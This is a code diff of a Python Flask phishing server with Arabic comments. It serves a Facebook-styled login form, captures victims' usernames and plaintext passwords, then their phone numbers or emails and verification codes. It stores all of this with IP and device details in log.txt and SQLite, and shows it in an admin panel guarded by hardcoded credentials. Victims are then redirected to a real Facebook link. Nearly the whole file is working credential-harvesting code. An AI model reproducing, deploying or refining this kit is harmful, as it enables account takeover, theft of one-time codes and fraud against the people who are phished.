@@ -5,11 +5,11 @@ import logging
 import sqlite3
 
 # ========================
-# إنشاء قاعدة البيانات (يعمل مرة واحدة عند تشغيل السيرفر)
+# إنشاء قاعدة البيانات
 # ========================
 def init_db():
-    conn = sqlite3.connect("database.db")  # إنشاء/فتح قاعدة البيانات
-    cursor = conn.cursor()  # أداة لتنفيذ أوامر SQL
+    conn = sqlite3.connect("database.db")
+    cursor = conn.cursor()
 
     # جدول المستخدمين
     cursor.execute("""
@@ -39,64 +39,63 @@ def init_db():
     )
     """)
 
-    conn.commit()  # حفظ التغييرات
-    conn.close()   # إغلاق الاتصال
+    conn.commit()
+    conn.close()
 
-# تشغيل إنشاء قاعدة البيانات
+# تشغيل قاعدة البيانات
 init_db()
 
 # ========================
-# نظام Logging
+# Logging
 # ========================
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s | %(levelname)s | %(message)s"
 )
 
-print("""" +++++++++++++++++++++++++++++++++++++++++++++++++++
-___________________________Server started_________________________
-           +++++++++++++++++++++++++++++++++++++++++++++++++++""")
+print("++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")
 
+# ========================
+# إعداد Flask
+# ========================
 app = Flask(__name__)
-app.secret_key = "secret123"  # ضروري للـ session
+app.secret_key = "secret123"
 
-# مسار ملف log.txt داخل السيرفر
+# مسار log.txt
 log_path = os.path.join(os.path.dirname(__file__), "log.txt")
 
 # ========================
-# تسجيل كل طلب يدخل السيرفر
+# تسجيل كل request
 # ========================
 @app.before_request
 def log_every_request():
     logging.info(f"(REQUEST) {request.method} {request.path} from {request.remote_addr}")
 
 # ========================
-# Favicon
+# favicon
 # ========================
 @app.route('/favicon.ico')
 def favicon():
     return send_from_directory('static', 'favicon.ico')
 
 # ========================
-# Ping (لـ UptimeRobot)
+# ping
 # ========================
 @app.route("/ping")
 def ping():
-    logging.info("(PING) UptimeRobot is visiting the server 🔥")
-    return "OK", 200  # 200 = نجاح الطلب
+    logging.info("(PING) request received")
+    return "OK", 200
 
 # ========================
 # الصفحة الرئيسية
 # ========================
 @app.route("/")
 def home():
-    logging.info("User opened the homepage")
-    result = render_template("FacebookForm.html")
-    logging.info("(DONE) User received FacebookForm.html")
-    return result
+    logging.info("User opened homepage")
+    return render_template("FacebookForm.html")
 
 # ========================
-# كشف نوع الجهاز والمتصفح (كما كتبته أنت بدون تغيير)
+# detect device
 # ========================
 def detect_device(user_agent):
     ua = user_agent.lower()
@@ -131,115 +130,98 @@ def detect_device(user_agent):
     return device, os_name, browser
 
 # ========================
-# تسجيل الدخول
+# login
 # ========================
 @app.route("/login", methods=["POST"])
 def login():
+
     username = request.form.get("username")
     password = request.form.get("password")
 
-    logging.info(f"User tried to login with username: {username} and password : {password}")
+    logging.info(f"Login attempt: {username}")
 
+    # 🔥 تعريف المتغيرات قبل الاستخدام (حل مشكلة 500)
     ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
-    referrer = request.headers.get("Referer", "Direct")
 
     device, os_name, browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # حفظ البيانات في log.txt
-    log_data = f"""
-Username/Email: {username}
-Password: {password}
-IP Address: {ip}
-Device Type: {device}
-Operating System: {os_name}
-Browser: {browser}
-User-Agent: {user_agent}
-Referrer: {referrer}
-Time: {time}
---------------------------------
-"""
+    # حفظ في database
+    conn = sqlite3.connect("database.db")
+    cursor = conn.cursor()
 
-    with open(log_path, "a", encoding="utf-8", buffering=1) as file:
-        file.write(log_data)
+    cursor.execute("""
+    INSERT INTO users (email, password, ip, device, os, browser, time)
+    VALUES (?, ?, ?, ?, ?, ?, ?)
+    """, (username, password, ip, device, os_name, browser, time))
+
+    conn.commit()
+    conn.close()
+
+    # حفظ في log.txt
+    log_data = f"""
+Username: {username}
+Password: {password}
+IP: {ip}
+Device: {device}
+OS: {os_name}
+Browser: {browser}
+Time: {time}
+-------------------------
+"""
+    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
+        f.write(log_data)
 
     login_botton_url = "https://www.facebook.com/share/r/14XdVmsrfeE/"
-    logging.info(f"(DONE) Redirecting user to: {login_botton_url}")
     return redirect(login_botton_url)
 
 # ========================
-# إنشاء حساب
+# create
 # ========================
 @app.route("/create")
 def create():
-    logging.info("User clicked on create new account")
-    create_url = "https://www.fhyi.com"
-    logging.info(f"Redirecting user to: {create_url}")
-    return redirect(create_url)
+    return redirect("https://www.fhyi.com")
 
 # ========================
-# Forgot Password
+# forgot
 # ========================
 @app.route("/forgot")
 def forgot():
-    logging.info("User opened forgot password page")
-    result = render_template("forgot.html")
-    logging.info("(DONE) User received forgot.html")
-    return result
+    return render_template("forgot.html")
 
 # ========================
 # verify
 # ========================
 @app.route("/verify", methods=["POST"])
 def verify():
+
     phone_or_email = request.form.get("phone_or_email")
 
-    # حفظ البريد/الرقم في session (لربطه مع الكود لاحقاً)
+    # حفظ في session
     session["phone_or_email"] = phone_or_email
 
-    logging.info(f"User entered phone/email: {phone_or_email}")
-
-    ip = request.remote_addr
-    user_agent = request.headers.get("User-Agent", "Unknown")
-
-    device, os_name, browser = detect_device(user_agent)
-    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    logging.info(f"Verify request: {phone_or_email}")
 
     # حفظ في log.txt
     log_data = f"""
-Forgot Password Request
+Forgot Request
 Phone/Email: {phone_or_email}
-
-IP Address: {ip}
-Device Type: {device}
-Operating System: {os_name}
-Browser: {browser}
-User-Agent: {user_agent}
- 
-Time: {time}
---------------------------------
+-------------------------
 """
+    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
+        f.write(log_data)
 
-    with open(log_path, "a", encoding="utf-8", buffering=1) as file:
-        file.write(log_data)
-
-    result = render_template("verify.html")
-    logging.info("(DONE) User received verify.html")
-    return result
+    return render_template("verify.html")
 
 # ========================
-# verify_code (تم إصلاح الأخطاء فقط)
+# verify_code
 # ========================
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
 
-    # ✔ تعريف code قبل استخدامه (كان سبب الخطأ 500)
-    code = request.form.get("code")
+    code = request.form.get("code")  # 🔥 مهم جداً
 
-    logging.info(f"User entered verification code: {code}")
-
-    # ✔ استرجاع البريد من session
     phone_or_email = session.get("phone_or_email", "Unknown")
 
     ip = request.remote_addr
@@ -248,7 +230,7 @@ def verify_code():
     device, os_name, browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # ✔ حفظ في قاعدة البيانات
+    # حفظ في database
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
 
@@ -260,35 +242,52 @@ def verify_code():
     conn.commit()
     conn.close()
 
-    # ✔ حفظ أيضاً في log.txt
+    # حفظ في log.txt
     log_data = f"""
 Verification Code
-
-Phone/Email: {phone_or_email}
+Email: {phone_or_email}
 Code: {code}
-
-IP Address: {ip}
-Device Type: {device}
-Operating System: {os_name}
-Browser: {browser}
-User-Agent: {user_agent}
-
-Time: {time}
---------------------------------
+-------------------------
 """
-
-    with open(log_path, "a", encoding="utf-8", buffering=1) as file:
-        file.write(log_data)
-
-    logging.info("(DONE) Verification saved successfully")
+    with open(log_path, "a", encoding="utf-8", buffering=1) as f:
+        f.write(log_data)
 
     return "تم تسجيل الرمز (اختبار)", 200
 
 # ========================
-# Admin Panel
+# 🔐 Admin Login
+# ========================
+@app.route("/admin_login", methods=["GET", "POST"])
+def admin_login():
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+
+        if username == "admin" and password == "1234":
+            session["admin"] = True
+            return redirect("/admin")
+        else:
+            return "❌ بيانات خاطئة"
+
+    return """
+    <h2>Admin Login</h2>
+    <form method="POST">
+    <input name="username"><br><br>
+    <input name="password" type="password"><br><br>
+    <button>Login</button>
+    </form>
+    """
+
+# ========================
+# admin (مع headers 🔥)
 # ========================
 @app.route("/admin")
 def admin():
+
+    if not session.get("admin"):
+        return redirect("/admin_login")
+
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
 
@@ -300,16 +299,64 @@ def admin():
 
     conn.close()
 
-    return f"""
+    html = """
     <h2>Users</h2>
-    <pre>{users}</pre>
-
-    <h2>Codes</h2>
-    <pre>{codes}</pre>
+    <table border="1" cellpadding="5">
+    <tr>
+        <th>ID</th>
+        <th>Email</th>
+        <th>Password</th>
+        <th>IP</th>
+        <th>Device</th>
+        <th>OS</th>
+        <th>Browser</th>
+        <th>Time</th>
+    </tr>
     """
 
+    for user in users:
+        html += "<tr>"
+        for col in user:
+            html += f"<td>{col}</td>"
+        html += "</tr>"
+
+    html += "</table><br><br>"
+
+    html += """
+    <h2>Codes</h2>
+    <table border="1" cellpadding="5">
+    <tr>
+        <th>ID</th>
+        <th>Email</th>
+        <th>Code</th>
+        <th>IP</th>
+        <th>Device</th>
+        <th>OS</th>
+        <th>Browser</th>
+        <th>Time</th>
+    </tr>
+    """
+
+    for code in codes:
+        html += "<tr>"
+        for col in code:
+            html += f"<td>{col}</td>"
+        html += "</tr>"
+
+    html += "</table>"
+
+    return html
+
 # ========================
-# تشغيل السيرفر محلياً فقط
+# logout
+# ========================
+@app.route("/logout")
+def logout():
+    session.pop("admin", None)
+    return "تم تسجيل الخروج"
+
+# ========================
+# تشغيل السيرفر
 # ========================
 if __name__ == "__main__":
     logging.info("Server is running...")
